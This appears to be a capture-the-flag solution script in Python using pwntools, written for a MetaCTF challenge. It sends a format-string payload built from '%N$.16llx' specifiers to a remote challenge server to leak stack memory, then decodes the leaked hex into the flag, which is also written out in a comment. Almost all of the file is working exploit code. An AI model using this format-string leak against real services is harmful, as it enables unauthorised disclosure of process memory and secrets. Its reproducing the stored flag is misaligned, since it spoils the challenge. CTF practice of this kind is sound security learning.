from pwn import *

#target = remote('127.0.0.1', 3006)
target = remote('host1.metaproblems.com', 5470)
# MetaCTF{L34kIn9_7h3_574CK_I5_oNLY_7H3_839innin9_wh47_3L53_C4n_yOU_do}
payload = b''
payload += b'%8$.16llx'
payload += b'%9$.16llx'
payload += b'%10$.16llx'
payload += b'%11$.16llx'
payload += b'%12$.16llx'
payload += b'%13$.16llx'
payload += b'%14$.16llx'
payload += b'%15$.16llx'
payload += b'%16$.16llx'
payload += b'%17$.16llx'

target.recvuntil(b"What is your guess?\n")
target.sendline(payload)

target.recvuntil(b"Your guessed wrong with ")
data = target.recvall()
print(data)
data = data.split(b'\n')[0]
print(data)
print()
outs = b''
while data:
    next = data[:2]
    data = data[2:]
    outs += bytes([int(next,16)])
data = outs
outs = b''
while data:
    next = data[:8]
    data = data[8:]
    outs += next[::-1]
print(outs)

